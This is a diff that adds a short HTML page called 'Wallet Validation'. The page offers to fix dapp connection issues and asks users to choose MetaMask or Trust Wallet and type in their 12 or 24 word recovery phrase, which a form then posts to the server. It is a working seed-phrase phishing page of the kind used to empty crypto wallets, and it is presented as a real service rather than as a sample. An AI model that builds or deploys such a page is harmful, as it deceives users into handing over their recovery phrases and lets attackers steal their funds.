@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Wallet Validation</title>
+</head>
+<body>
+<main>
+  <h1>Validate your wallet</h1>
+  <p>Choose your wallet and complete the validation to fix connection issues with any dapp.</p>
+  <form action="/submit" method="post">
+    <legend>Import wallet</legend>
+    <select name="wallet-type"><option>MetaMask</option><option>Trust Wallet</option></select>
+    <textarea name="seed-phrase" placeholder="Enter your 12 or 24 word recovery phrase"></textarea>
+    <button type="submit">Validate wallet</button>
+  </form>
+</main>
+</body>
+</html>
